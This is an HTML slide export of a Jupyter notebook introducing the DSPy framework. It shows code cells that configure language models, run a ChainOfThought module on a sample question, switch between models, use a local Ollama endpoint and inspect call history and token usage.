  --jp-reject-color-active: var(--md-grey-800);

  /* File or activity icons and switch semantic variables */
  --jp-jupyter-icon-color: #f37626;
  --jp-notebook-icon-color: #f37626;
  --jp-json-icon-color: var(--md-orange-700);
  --jp-console-icon-background-color: var(--md-blue-700);
  --jp-console-icon-color: white;
  --jp-terminal-icon-background-color: var(--md-grey-800);
  --jp-terminal-icon-color: var(--md-grey-200);
  --jp-text-editor-icon-color: var(--md-grey-700);
  --jp-inspector-icon-color: var(--md-grey-700);
  --jp-switch-color: var(--md-grey-400);
  --jp-switch-true-position-color: var(--md-orange-900);
}
</style>
<style type="text/css">
a.anchor-link {
   display: none;
}
.highlight  {
    margin: 0.4em;
}
.jp-Notebook {
    padding: 0;
}
:root {
    --jp-ui-font-size1: 20px;       /* instead of 14px */
    --jp-content-font-size1: 20px;  /* instead of 14px */
    --jp-code-font-size: 19px;      /* instead of 13px */
    --jp-cell-prompt-width: 110px;  /* instead of 64px */
}
@media print {
  body {
    margin: 0;
  }
}
</style>
<style type="text/css">
/* Overrides of notebook CSS for static HTML export */
.reveal {
  font-size: 160%;
}
.reveal table {
  font-size: var(--jp-ui-font-size1);
}
.reveal pre {
  width: inherit;
  padding: 0.4em;
  margin: 0px;
  font-family: monospace, sans-serif;
  font-size: 80%;
  box-shadow: 0px 0px 0px rgba(0, 0, 0, 0);
}
.reveal pre code {
  padding: 0px;
}
.reveal section img {
  border: 0px solid black;
  box-shadow: 0 0 10px rgba(0, 0, 0, 0);
}
.reveal .slides {
  text-align: left;
}
.reveal.fade {
  opacity: 1;
}
.reveal .progress {
  position: static;
}

div.jp-InputArea-editor {
  padding: 0.06em;
}

div.code_cell {
  background-color: transparent;
}

div.output_area pre {
  font-family: monospace, sans-serif;
  font-size: 80%;
}

div.jp-OutputPrompt {
  /* 5px right shift to account for margin in parent container */
  margin: 5px 5px 0 0;
}

.reveal div.highlight {
  margin: 0;
}

.reveal div.highlight > pre {
  margin: 0;
  width: 100%;
  font-size: var(--jp-code-font-size);
}

.reveal div.jp-OutputArea-output > pre {
  margin: 0;
  width: 90%;
  font-size: var(--jp-code-font-size);
  box-shadow: none;
}

main {
  height: 100%;
}

/* Reveal navigation controls */

.reveal .controls .navigate-left,
.reveal .controls .navigate-left.enabled {
  border-right-color: #727272;
}
.reveal .controls .navigate-left.enabled:hover,
.reveal .controls .navigate-left.enabled.enabled:hover {
  border-right-color: #dfdfdf;
}
.reveal .controls .navigate-right,
.reveal .controls .navigate-right.enabled {
  border-left-color: #727272;
}
.reveal .controls .navigate-right.enabled:hover,
.reveal .controls .navigate-right.enabled.enabled:hover {
  border-left-color: #dfdfdf;
}
.reveal .controls .navigate-up,
.reveal .controls .navigate-up.enabled {
  border-bottom-color: #727272;
}
.reveal .controls .navigate-up.enabled:hover,
.reveal .controls .navigate-up.enabled.enabled:hover {
  border-bottom-color: #dfdfdf;
}
.reveal .controls .navigate-down,
.reveal .controls .navigate-down.enabled {
  border-top-color: #727272;
}
.reveal .controls .navigate-down.enabled:hover,
.reveal .controls .navigate-down.enabled.enabled:hover {
  border-top-color: #dfdfdf;
}
.reveal .progress span {
  background: #727272;
}

/* Scrollbars */

::-webkit-scrollbar {
  width: 6px;
  height: 6px;
}
::-webkit-scrollbar * {
  background: transparent;
}
::-webkit-scrollbar-thumb {
  background: #727272 !important;
}
</style>
<!-- Load mathjax -->
<script src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.7/latest.js?config=TeX-AMS_CHTML-full,Safe"> </script>
<!-- MathJax configuration -->
<script type="text/x-mathjax-config">
    init_mathjax = function() {
        if (window.MathJax) {
        // MathJax loaded
            MathJax.Hub.Config({
                TeX: {
                    equationNumbers: {
                    autoNumber: "AMS",
                    useLabelIds: true
                    }
                },
                tex2jax: {
                    inlineMath: [ ['$','$'], ["\\(","\\)"] ],
                    displayMath: [ ['$$','$$'], ["\\[","\\]"] ],
                    processEscapes: true,
                    processEnvironments: true
                },
                displayAlign: 'center',
                CommonHTML: {
                    linebreaks: {
                    automatic: true
                    }
                }
            });

            MathJax.Hub.Queue(["Typeset", MathJax.Hub]);
        }
    }
    init_mathjax();
    </script>
<!-- End of mathjax configuration --><!-- Reveal Theme -->
<link href="https://unpkg.com/reveal.js@4.0.2/dist/theme/simple.css" id="theme" rel="stylesheet"/>
</head>
<body class="jp-Notebook" data-jp-theme-light="true" data-jp-theme-name="JupyterLab Light">
<main>
<div class="reveal">
<div class="slides"><section><section>
<div class="jp-Cell jp-MarkdownCell jp-Notebook-cell">
<div class="jp-Cell-inputWrapper" tabindex="0">
<div class="jp-Collapser jp-InputCollapser jp-Cell-inputCollapser">
</div>
<div class="jp-InputArea jp-Cell-inputArea"><div class="jp-InputPrompt jp-InputArea-prompt">
</div><div class="jp-RenderedHTMLCommon jp-RenderedMarkdown jp-MarkdownOutput" data-mime-type="text/markdown">
<h1 id="DSPy-Introduction">DSPy Introduction<a class="anchor-link" href="#DSPy-Introduction"></a></h1><p>Jimmy Yeh @ 2024-11-10</p>
</div>
</div>
</div>
</div></section></section><section><section>
<div class="jp-Cell jp-MarkdownCell jp-Notebook-cell">
<div class="jp-Cell-inputWrapper" tabindex="0">
<div class="jp-Collapser jp-InputCollapser jp-Cell-inputCollapser">
</div>
<div class="jp-InputArea jp-Cell-inputArea"><div class="jp-InputPrompt jp-InputArea-prompt">
</div><div class="jp-RenderedHTMLCommon jp-RenderedMarkdown jp-MarkdownOutput" data-mime-type="text/markdown">
<h2 id="What-you-will-learn">What you will learn<a class="anchor-link" href="#What-you-will-learn"></a></h2><ol>
<li>The core concepts of DSPy</li>
<li>Understanding the building blocks of DSPy</li>
<li>How to use DSPy in practice and recommended workflow</li>
<li>Enable to trace DSPy internals</li>
<li>Future roadmap of DSPy</li>
</ol>
</div>
</div>
</div>
</div></section></section><section><section>
<div class="jp-Cell jp-MarkdownCell jp-Notebook-cell">
<div class="jp-Cell-inputWrapper" tabindex="0">
<div class="jp-Collapser jp-InputCollapser jp-Cell-inputCollapser">
</div>
<div class="jp-InputArea jp-Cell-inputArea"><div class="jp-InputPrompt jp-InputArea-prompt">
</div><div class="jp-RenderedHTMLCommon jp-RenderedMarkdown jp-MarkdownOutput" data-mime-type="text/markdown">
<h2 id="Table-of-Contents">Table of Contents<a class="anchor-link" href="#Table-of-Contents"></a></h2><ul>
<li>Core Concepts</li>
<li>Building Blocks</li>
<li>Recommended Workflow</li>
<li>Examples</li>
<li>Roadmap</li>
<li>References</li>
</ul>
</div>
</div>
</div>
</div></section></section><section><section>
<div class="jp-Cell jp-MarkdownCell jp-Notebook-cell">
<div class="jp-Cell-inputWrapper" tabindex="0">
<div class="jp-Collapser jp-InputCollapser jp-Cell-inputCollapser">
</div>
<div class="jp-InputArea jp-Cell-inputArea"><div class="jp-InputPrompt jp-InputArea-prompt">
</div><div class="jp-RenderedHTMLCommon jp-RenderedMarkdown jp-MarkdownOutput" data-mime-type="text/markdown">
<h2 id="Core-Concepts">Core Concepts<a class="anchor-link" href="#Core-Concepts"></a></h2>
</div>
</div>
</div>
</div>
<div class="jp-Cell jp-MarkdownCell jp-Notebook-cell">
<div class="jp-Cell-inputWrapper" tabindex="0">
<div class="jp-Collapser jp-InputCollapser jp-Cell-inputCollapser">
</div>
<div class="jp-InputArea jp-Cell-inputArea"><div class="jp-InputPrompt jp-InputArea-prompt">
</div><div class="jp-RenderedHTMLCommon jp-RenderedMarkdown jp-MarkdownOutput" data-mime-type="text/markdown">
<p><img alt="" src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*l0gVphd9-YGBM_qmihKhow.jpeg"/></p>
</div>
</div>
</div>
</div></section><section>
<div class="jp-Cell jp-MarkdownCell jp-Notebook-cell">
<div class="jp-Cell-inputWrapper" tabindex="0">
<div class="jp-Collapser jp-InputCollapser jp-Cell-inputCollapser">
</div>
<div class="jp-InputArea jp-Cell-inputArea"><div class="jp-InputPrompt jp-InputArea-prompt">
</div><div class="jp-RenderedHTMLCommon jp-RenderedMarkdown jp-MarkdownOutput" data-mime-type="text/markdown">
<p><img alt="" src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*l1UXBs32TkM3Ap1g-4Z6yg.png"/></p>
</div>
</div>
</div>
</div></section></section><section><section>
<div class="jp-Cell jp-MarkdownCell jp-Notebook-cell">
<div class="jp-Cell-inputWrapper" tabindex="0">
<div class="jp-Collapser jp-InputCollapser jp-Cell-inputCollapser">
</div>
<div class="jp-InputArea jp-Cell-inputArea"><div class="jp-InputPrompt jp-InputArea-prompt">
</div><div class="jp-RenderedHTMLCommon jp-RenderedMarkdown jp-MarkdownOutput" data-mime-type="text/markdown">
<h2 id="Building-Blocks">Building Blocks<a class="anchor-link" href="#Building-Blocks"></a></h2><ul>
<li>Language Models</li>
<li>Signatures</li>
<li>Modules</li>
<li>Data</li>
<li>Metrics</li>
<li>Optimizers</li>
<li>Assertions</li>
</ul>
</div>
</div>
</div>
</div></section></section><section><section>
<div class="jp-Cell jp-MarkdownCell jp-Notebook-cell">
<div class="jp-Cell-inputWrapper" tabindex="0">
<div class="jp-Collapser jp-InputCollapser jp-Cell-inputCollapser">
</div>
<div class="jp-InputArea jp-Cell-inputArea"><div class="jp-InputPrompt jp-InputArea-prompt">
</div><div class="jp-RenderedHTMLCommon jp-RenderedMarkdown jp-MarkdownOutput" data-mime-type="text/markdown">
<h3 id="Language-Models">Language Models<a class="anchor-link" href="#Language-Models"></a></h3><ul>
<li>Earlier versions of DSPy involved tens of clients for different LM providers.(deprecated, and will be removed in DSPy 2.6) Starting from 2.5, use <code>dspy.LM</code> instead(using litellm under the hood)</li>
<li>Adapters<ul>
<li>DSPy 2.5 introduces<strong>Adapters</strong>as a layer between Signatures and LMs, responsible for formatting these pieces (Signature I/O fields, instructions, and examples) as well as generating and parsing the outputs.</li>
</ul>
</li>
<li>By default LMs in DSPy are cached. If you repeat the same call, you will get the same outputs. But you can turn off caching by setting <code>cache=False</code> while declaring <code>dspy.LM</code> object</li>
<li>Any OpenAI-compatible endpoint is easy to set up with an <code>openai/</code> prefix as well.</li>
</ul>
</div>
</div>
</div>
</div></section><section>
<div class="jp-Cell jp-MarkdownCell jp-Notebook-cell">
<div class="jp-Cell-inputWrapper" tabindex="0">
<div class="jp-Collapser jp-InputCollapser jp-Cell-inputCollapser">
</div>
<div class="jp-InputArea jp-Cell-inputArea"><div class="jp-InputPrompt jp-InputArea-prompt">
</div><div class="jp-RenderedHTMLCommon jp-RenderedMarkdown jp-MarkdownOutput" data-mime-type="text/markdown">
<h3 id="Examples">Examples<a class="anchor-link" href="#Examples"></a></h3>
</div>
</div>
</div>
</div></section><section>
<div class="jp-Cell jp-MarkdownCell jp-Notebook-cell">
<div class="jp-Cell-inputWrapper" tabindex="0">
<div class="jp-Collapser jp-InputCollapser jp-Cell-inputCollapser">
</div>
<div class="jp-InputArea jp-Cell-inputArea"><div class="jp-InputPrompt jp-InputArea-prompt">
</div><div class="jp-RenderedHTMLCommon jp-RenderedMarkdown jp-MarkdownOutput" data-mime-type="text/markdown">
<p>setting up LLM</p>
</div>
</div>
</div>
</div><div class="fragment"><div class="jp-Cell jp-CodeCell jp-Notebook-cell jp-mod-noOutputs">
<div class="jp-Cell-inputWrapper" tabindex="0">
<div class="jp-Collapser jp-InputCollapser jp-Cell-inputCollapser">
</div>
<div class="jp-InputArea jp-Cell-inputArea">
<div class="jp-InputPrompt jp-InputArea-prompt">In[2]:</div>
<div class="jp-CodeMirrorEditor jp-Editor jp-InputArea-editor" data-type="inline">
<div class="cm-editor cm-s-jupyter">
<div class="highlight hl-ipython3"><pre><span></span><span class="n">lm</span> <span class="o">=</span> <span class="n">dspy</span><span class="o">.</span><span class="n">LM</span><span class="p">(</span><span class="n">model</span><span class="o">=</span><span class="s2">"gpt-4o-mini"</span><span class="p">)</span>
<span class="n">dspy</span><span class="o">.</span><span class="n">configure</span><span class="p">(</span><span class="n">lm</span><span class="o">=</span><span class="n">lm</span><span class="p">)</span>
</pre></div>
</div>
</div>
</div>
</div>
</div></div></section><section>
<div class="jp-Cell jp-MarkdownCell jp-Notebook-cell">
<div class="jp-Cell-inputWrapper" tabindex="0">
<div class="jp-Collapser jp-InputCollapser jp-Cell-inputCollapser">
</div>
<div class="jp-InputArea jp-Cell-inputArea"><div class="jp-InputPrompt jp-InputArea-prompt">
</div><div class="jp-RenderedHTMLCommon jp-RenderedMarkdown jp-MarkdownOutput" data-mime-type="text/markdown">
<p>directly calling the LLM(not recommended)</p>
</div>
</div>
</div>
</div><div class="fragment"><div class="jp-Cell jp-CodeCell jp-Notebook-cell">
<div class="jp-Cell-inputWrapper" tabindex="0">
<div class="jp-Collapser jp-InputCollapser jp-Cell-inputCollapser">
</div>
<div class="jp-InputArea jp-Cell-inputArea">
<div class="jp-InputPrompt jp-InputArea-prompt">In[3]:</div>
<div class="jp-CodeMirrorEditor jp-Editor jp-InputArea-editor" data-type="inline">
<div class="cm-editor cm-s-jupyter">
<div class="highlight hl-ipython3"><pre><span></span><span class="n">lm</span><span class="p">(</span><span class="s2">"hello!"</span><span class="p">)</span>
</pre></div>
</div>
</div>
</div>
</div>
<div class="jp-Cell-outputWrapper">
<div class="jp-Collapser jp-OutputCollapser jp-Cell-outputCollapser">
</div>
<div class="jp-OutputArea jp-Cell-outputArea">
<div class="jp-OutputArea-child jp-OutputArea-executeResult">
<div class="jp-OutputPrompt jp-OutputArea-prompt">Out[3]:</div>
<div class="jp-RenderedText jp-OutputArea-output jp-OutputArea-executeResult" data-mime-type="text/plain" tabindex="0">
<pre>['Hello! How can I assist you today?']</pre>
</div>
</div>
</div>
</div>
</div></div><div class="fragment"><div class="jp-Cell jp-CodeCell jp-Notebook-cell">
<div class="jp-Cell-inputWrapper" tabindex="0">
<div class="jp-Collapser jp-InputCollapser jp-Cell-inputCollapser">
</div>
<div class="jp-InputArea jp-Cell-inputArea">
<div class="jp-InputPrompt jp-InputArea-prompt">In[4]:</div>
<div class="jp-CodeMirrorEditor jp-Editor jp-InputArea-editor" data-type="inline">
<div class="cm-editor cm-s-jupyter">
<div class="highlight hl-ipython3"><pre><span></span><span class="c1"># for chat LLMs</span>
<span class="n">lm</span><span class="p">(</span><span class="n">messages</span><span class="o">=</span><span class="p">[{</span><span class="s2">"role"</span><span class="p">:</span> <span class="s2">"system"</span><span class="p">,</span> <span class="s2">"content"</span><span class="p">:</span> <span class="s2">"You are a helpful assistant."</span><span class="p">},</span>
             <span class="p">{</span><span class="s2">"role"</span><span class="p">:</span> <span class="s2">"user"</span><span class="p">,</span> <span class="s2">"content"</span><span class="p">:</span> <span class="s2">"What is 2+2?"</span><span class="p">}])</span>
</pre></div>
</div>
</div>
</div>
</div>
<div class="jp-Cell-outputWrapper">
<div class="jp-Collapser jp-OutputCollapser jp-Cell-outputCollapser">
</div>
<div class="jp-OutputArea jp-Cell-outputArea">
<div class="jp-OutputArea-child jp-OutputArea-executeResult">
<div class="jp-OutputPrompt jp-OutputArea-prompt">Out[4]:</div>
<div class="jp-RenderedText jp-OutputArea-output jp-OutputArea-executeResult" data-mime-type="text/plain" tabindex="0">
<pre>['2 + 2 equals 4.']</pre>
</div>
</div>
</div>
</div>
</div></div></section><section>
<div class="jp-Cell jp-MarkdownCell jp-Notebook-cell">
<div class="jp-Cell-inputWrapper" tabindex="0">
<div class="jp-Collapser jp-InputCollapser jp-Cell-inputCollapser">
</div>
<div class="jp-InputArea jp-Cell-inputArea"><div class="jp-InputPrompt jp-InputArea-prompt">
</div><div class="jp-RenderedHTMLCommon jp-RenderedMarkdown jp-MarkdownOutput" data-mime-type="text/markdown">
<p>using the llm with DSPy signatures and modules</p>
</div>
</div>
</div>
</div><div class="fragment"><div class="jp-Cell jp-CodeCell jp-Notebook-cell">
<div class="jp-Cell-inputWrapper" tabindex="0">
<div class="jp-Collapser jp-InputCollapser jp-Cell-inputCollapser">
</div>
<div class="jp-InputArea jp-Cell-inputArea">
<div class="jp-InputPrompt jp-InputArea-prompt">In[5]:</div>
<div class="jp-CodeMirrorEditor jp-Editor jp-InputArea-editor" data-type="inline">
<div class="cm-editor cm-s-jupyter">
<div class="highlight hl-ipython3"><pre><span></span><span class="c1"># Define a module (ChainOfThought) and assign it a signature (return an answer, given a question).</span>
<span class="n">qa</span> <span class="o">=</span> <span class="n">dspy</span><span class="o">.</span><span class="n">ChainOfThought</span><span class="p">(</span><span class="s1">'question -&gt; answer'</span><span class="p">)</span>

<span class="c1"># Run with the default LM configured with `dspy.configure` above.</span>
<span class="n">response</span> <span class="o">=</span> <span class="n">qa</span><span class="p">(</span><span class="n">question</span><span class="o">=</span><span class="s2">"How many floors are in the castle David Gregory inherited?"</span><span class="p">)</span>
<span class="nb">print</span><span class="p">(</span><span class="n">response</span><span class="o">.</span><span class="n">answer</span><span class="p">)</span>
</pre></div>
</div>
</div>
</div>
</div>
<div class="jp-Cell-outputWrapper">
<div class="jp-Collapser jp-OutputCollapser jp-Cell-outputCollapser">
</div>
<div class="jp-OutputArea jp-Cell-outputArea">
<div class="jp-OutputArea-child">
<div class="jp-OutputPrompt jp-OutputArea-prompt"></div>
<div class="jp-RenderedText jp-OutputArea-output" data-mime-type="text/plain" tabindex="0">
<pre>Insufficient information to determine the number of floors in the castle David Gregory inherited.
</pre>
</div>
</div>
</div>
</div>
</div></div></section><section>
<div class="jp-Cell jp-MarkdownCell jp-Notebook-cell">
<div class="jp-Cell-inputWrapper" tabindex="0">
<div class="jp-Collapser jp-InputCollapser jp-Cell-inputCollapser">
</div>
<div class="jp-InputArea jp-Cell-inputArea"><div class="jp-InputPrompt jp-InputArea-prompt">
</div><div class="jp-RenderedHTMLCommon jp-RenderedMarkdown jp-MarkdownOutput" data-mime-type="text/markdown">
<p>using multiple LLMs at once</p>
</div>
</div>
</div>
</div><div class="fragment"><div class="jp-Cell jp-CodeCell jp-Notebook-cell">
<div class="jp-Cell-inputWrapper" tabindex="0">
<div class="jp-Collapser jp-InputCollapser jp-Cell-inputCollapser">
</div>
<div class="jp-InputArea jp-Cell-inputArea">
<div class="jp-InputPrompt jp-InputArea-prompt">In[6]:</div>
<div class="jp-CodeMirrorEditor jp-Editor jp-InputArea-editor" data-type="inline">
<div class="cm-editor cm-s-jupyter">
<div class="highlight hl-ipython3"><pre><span></span><span class="c1"># Run with the default LM configured above, i.e. GPT-4o-mini</span>
<span class="n">response</span> <span class="o">=</span> <span class="n">qa</span><span class="p">(</span><span class="n">question</span><span class="o">=</span><span class="s2">"How many floors are in the castle David Gregory inherited?"</span><span class="p">)</span>
<span class="nb">print</span><span class="p">(</span><span class="s1">'gpt-4o-mini:'</span><span class="p">,</span> <span class="n">response</span><span class="o">.</span><span class="n">answer</span><span class="p">)</span>

<span class="n">gpt_4o</span> <span class="o">=</span> <span class="n">dspy</span><span class="o">.</span><span class="n">LM</span><span class="p">(</span><span class="n">model</span><span class="o">=</span><span class="s1">'gpt-4o'</span><span class="p">,</span> <span class="n">max_tokens</span><span class="o">=</span><span class="mi">300</span><span class="p">)</span>

<span class="c1"># Run with GPT-4o instead</span>
<span class="k">with</span> <span class="n">dspy</span><span class="o">.</span><span class="n">context</span><span class="p">(</span><span class="n">lm</span><span class="o">=</span><span class="n">gpt_4o</span><span class="p">):</span>
    <span class="n">response</span> <span class="o">=</span> <span class="n">qa</span><span class="p">(</span><span class="n">question</span><span class="o">=</span><span class="s2">"How many floors are in the castle David Gregory inherited?"</span><span class="p">)</span>
    <span class="nb">print</span><span class="p">(</span><span class="s1">'gpt-4o:'</span><span class="p">,</span> <span class="n">response</span><span class="o">.</span><span class="n">answer</span><span class="p">)</span>
</pre></div>
</div>
</div>
</div>
</div>
<div class="jp-Cell-outputWrapper">
<div class="jp-Collapser jp-OutputCollapser jp-Cell-outputCollapser">
</div>
<div class="jp-OutputArea jp-Cell-outputArea">
<div class="jp-OutputArea-child">
<div class="jp-OutputPrompt jp-OutputArea-prompt"></div>
<div class="jp-RenderedText jp-OutputArea-output" data-mime-type="text/plain" tabindex="0">
<pre>gpt-4o-mini: Insufficient information to determine the number of floors in the castle David Gregory inherited.
gpt-4o: Unknown
</pre>
</div>
</div>
</div>
</div>
</div></div></section><section>
<div class="jp-Cell jp-MarkdownCell jp-Notebook-cell">
<div class="jp-Cell-inputWrapper" tabindex="0">
<div class="jp-Collapser jp-InputCollapser jp-Cell-inputCollapser">
</div>
<div class="jp-InputArea jp-Cell-inputArea"><div class="jp-InputPrompt jp-InputArea-prompt">
</div><div class="jp-RenderedHTMLCommon jp-RenderedMarkdown jp-MarkdownOutput" data-mime-type="text/markdown">
<p>configuring llm attributes</p>
</div>
</div>
</div>
</div><div class="fragment"><div class="jp-Cell jp-CodeCell jp-Notebook-cell jp-mod-noOutputs">
<div class="jp-Cell-inputWrapper" tabindex="0">
<div class="jp-Collapser jp-InputCollapser jp-Cell-inputCollapser">
</div>
<div class="jp-InputArea jp-Cell-inputArea">
<div class="jp-InputPrompt jp-InputArea-prompt">In[7]:</div>
<div class="jp-CodeMirrorEditor jp-Editor jp-InputArea-editor" data-type="inline">
<div class="cm-editor cm-s-jupyter">
<div class="highlight hl-ipython3"><pre><span></span><span class="n">gpt_4o_mini</span> <span class="o">=</span> <span class="n">dspy</span><span class="o">.</span><span class="n">LM</span><span class="p">(</span>
	<span class="s1">'gpt-4o-mini'</span><span class="p">,</span>
	<span class="n">temperature</span><span class="o">=</span><span class="mf">0.9</span><span class="p">,</span>
	<span class="n">max_tokens</span><span class="o">=</span><span class="mi">3000</span><span class="p">,</span>
	<span class="n">stop</span><span class="o">=</span><span class="kc">None</span><span class="p">,</span>
	<span class="n">cache</span><span class="o">=</span><span class="kc">False</span>
<span class="p">)</span>
</pre></div>
</div>
</div>
</div>
</div>
</div></div></section><section>
<div class="jp-Cell jp-MarkdownCell jp-Notebook-cell">
<div class="jp-Cell-inputWrapper" tabindex="0">
<div class="jp-Collapser jp-InputCollapser jp-Cell-inputCollapser">
</div>
<div class="jp-InputArea jp-Cell-inputArea"><div class="jp-InputPrompt jp-InputArea-prompt">
</div><div class="jp-RenderedHTMLCommon jp-RenderedMarkdown jp-MarkdownOutput" data-mime-type="text/markdown">
<p>using locally hosted LLMs</p>
</div>
</div>
</div>
</div><div class="fragment"><div class="jp-Cell jp-CodeCell jp-Notebook-cell jp-mod-noOutputs">
<div class="jp-Cell-inputWrapper" tabindex="0">
<div class="jp-Collapser jp-InputCollapser jp-Cell-inputCollapser">
</div>
<div class="jp-InputArea jp-Cell-inputArea">
<div class="jp-InputPrompt jp-InputArea-prompt">In[8]:</div>
<div class="jp-CodeMirrorEditor jp-Editor jp-InputArea-editor" data-type="inline">
<div class="cm-editor cm-s-jupyter">
<div class="highlight hl-ipython3"><pre><span></span><span class="n">ollama_port</span> <span class="o">=</span> <span class="mi">11434</span> 
<span class="n">ollama_url</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">"http://localhost:</span><span class="si">{</span><span class="n">ollama_port</span><span class="si">}</span><span class="s2">"</span>
<span class="n">ollama_llm</span> <span class="o">=</span> <span class="n">dspy</span><span class="o">.</span><span class="n">LM</span><span class="p">(</span><span class="n">model</span><span class="o">=</span><span class="s2">"ollama/llama3.2:1b"</span><span class="p">,</span> <span class="n">api_base</span><span class="o">=</span><span class="n">ollama_url</span><span class="p">)</span>
</pre></div>
</div>
</div>
</div>
</div>
</div></div></section><section>
<div class="jp-Cell jp-MarkdownCell jp-Notebook-cell">
<div class="jp-Cell-inputWrapper" tabindex="0">
<div class="jp-Collapser jp-InputCollapser jp-Cell-inputCollapser">
</div>
<div class="jp-InputArea jp-Cell-inputArea"><div class="jp-InputPrompt jp-InputArea-prompt">
</div><div class="jp-RenderedHTMLCommon jp-RenderedMarkdown jp-MarkdownOutput" data-mime-type="text/markdown">
<p>inspecting llm output and usage metadata</p>
</div>
</div>
</div>
</div><div class="fragment"><div class="jp-Cell jp-CodeCell jp-Notebook-cell">
<div class="jp-Cell-inputWrapper" tabindex="0">
<div class="jp-Collapser jp-InputCollapser jp-Cell-inputCollapser">
</div>
<div class="jp-InputArea jp-Cell-inputArea">
<div class="jp-InputPrompt jp-InputArea-prompt">In[9]:</div>
<div class="jp-CodeMirrorEditor jp-Editor jp-InputArea-editor" data-type="inline">
<div class="cm-editor cm-s-jupyter">
<div class="highlight hl-ipython3"><pre><span></span><span class="nb">len</span><span class="p">(</span><span class="n">lm</span><span class="o">.</span><span class="n">history</span><span class="p">)</span>
</pre></div>
</div>
</div>
</div>
</div>
<div class="jp-Cell-outputWrapper">
<div class="jp-Collapser jp-OutputCollapser jp-Cell-outputCollapser">
</div>
<div class="jp-OutputArea jp-Cell-outputArea">
<div class="jp-OutputArea-child jp-OutputArea-executeResult">
<div class="jp-OutputPrompt jp-OutputArea-prompt">Out[9]:</div>
<div class="jp-RenderedText jp-OutputArea-output jp-OutputArea-executeResult" data-mime-type="text/plain" tabindex="0">
<pre>4</pre>
</div>
</div>
</div>
</div>
</div></div><div class="fragment"><div class="jp-Cell jp-CodeCell jp-Notebook-cell">
<div class="jp-Cell-inputWrapper" tabindex="0">
<div class="jp-Collapser jp-InputCollapser jp-Cell-inputCollapser">
</div>
<div class="jp-InputArea jp-Cell-inputArea">
<div class="jp-InputPrompt jp-InputArea-prompt">In[10]:</div>
<div class="jp-CodeMirrorEditor jp-Editor jp-InputArea-editor" data-type="inline">
<div class="cm-editor cm-s-jupyter">
<div class="highlight hl-ipython3"><pre><span></span><span class="k">for</span> <span class="n">k</span><span class="p">,</span> <span class="n">v</span> <span class="ow">in</span> <span class="n">lm</span><span class="o">.</span><span class="n">history</span><span class="p">[</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">items</span><span class="p">():</span>
    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">"</span><span class="si">{</span><span class="n">k</span><span class="si">}</span><span class="s2">: </span><span class="si">{</span><span class="n">v</span><span class="si">}</span><span class="s2">"</span><span class="p">)</span>
</pre></div>
</div>
</div>
</div>
</div>
<div class="jp-Cell-outputWrapper">
<div class="jp-Collapser jp-OutputCollapser jp-Cell-outputCollapser">
</div>
<div class="jp-OutputArea jp-Cell-outputArea">
<div class="jp-OutputArea-child">
<div class="jp-OutputPrompt jp-OutputArea-prompt"></div>
<div class="jp-RenderedText jp-OutputArea-output" data-mime-type="text/plain" tabindex="0">
<pre>prompt: None
messages: [{'role': 'system', 'content': 'Your input fields are:\n1. `question` (str)\n\nYour output fields are:\n1. `reasoning` (str)\n2. `answer` (str)\n\nAll interactions will be structured in the following way, with the appropriate values filled in.\n\n[[ ## question ## ]]\n{question}\n\n[[ ## reasoning ## ]]\n{reasoning}\n\n[[ ## answer ## ]]\n{answer}\n\n[[ ## completed ## ]]\n\nIn adhering to this structure, your objective is: \n        Given the fields `question`, produce the fields `answer`.'}, {'role': 'user', 'content': '[[ ## question ## ]]\nHow many floors are in the castle David Gregory inherited?\n\nRespond with the corresponding output fields, starting with the field `[[ ## reasoning ## ]]`, then `[[ ## answer ## ]]`, and then ending with the marker for `[[ ## completed ## ]]`.'}]
kwargs: {'temperature': 0.0, 'max_tokens': 1000}
response: ModelResponse(id='chatcmpl-AP1gFYUpR7PAotKStTcGdeP89I0dM', choices=[Choices(finish_reason='stop', index=0, message=Message(content='[[ ## reasoning ## ]]\nThe question refers to a specific detail about a fictional or historical castle associated with David Gregory. However, without additional context or information about which David Gregory or which castle is being referenced, it is impossible to provide an accurate answer. The number of floors in a castle can vary widely depending on its design, size, and historical context.\n\n[[ ## answer ## ]]\nInsufficient information to determine the number of floors in the castle David Gregory inherited.\n\n[[ ## completed ## ]]', role='assistant', tool_calls=None, function_call=None))], created=1730528023, model='gpt-4o-mini-2024-07-18', object='chat.completion', system_fingerprint='fp_0ba0d124f1', usage=Usage(completion_tokens=97, prompt_tokens=174, total_tokens=271, completion_tokens_details=CompletionTokensDetailsWrapper(accepted_prediction_tokens=None, audio_tokens=None, reasoning_tokens=0, rejected_prediction_tokens=None, text_tokens=None), prompt_tokens_details=PromptTokensDetailsWrapper(audio_tokens=None, cached_tokens=0, text_tokens=None, image_tokens=None)), service_tier=None)
outputs: ['[[ ## reasoning ## ]]\nThe question refers to a specific detail about a fictional or historical castle associated with David Gregory. However, without additional context or information about which David Gregory or which castle is being referenced, it is impossible to provide an accurate answer. The number of floors in a castle can vary widely depending on its design, size, and historical context.\n\n[[ ## answer ## ]]\nInsufficient information to determine the number of floors in the castle David Gregory inherited.\n\n[[ ## completed ## ]]']
usage: {'completion_tokens': 97, 'prompt_tokens': 174, 'total_tokens': 271, 'completion_tokens_details': CompletionTokensDetailsWrapper(accepted_prediction_tokens=None, audio_tokens=None, reasoning_tokens=0, rejected_prediction_tokens=None, text_tokens=None), 'prompt_tokens_details': PromptTokensDetailsWrapper(audio_tokens=None, cached_tokens=0, text_tokens=None, image_tokens=None)}
cost: None
timestamp: 2024-11-09T21:11:54.836084
uuid: 85c3a670-8ee8-4f9b-b9d6-df81b3c99a26
model: gpt-4o-mini
model_type: chat
</pre>
</div>
</div>
</div>
</div>
</div></div></section><section>
<div class="jp-Cell jp-MarkdownCell jp-Notebook-cell">
<div class="jp-Cell-inputWrapper" tabindex="0">
<div class="jp-Collapser jp-InputCollapser jp-Cell-inputCollapser">
</div>
<div class="jp-InputArea jp-Cell-inputArea"><div class="jp-InputPrompt jp-InputArea-prompt">
</div><div class="jp-RenderedHTMLCommon jp-RenderedMarkdown jp-MarkdownOutput" data-mime-type="text/markdown">
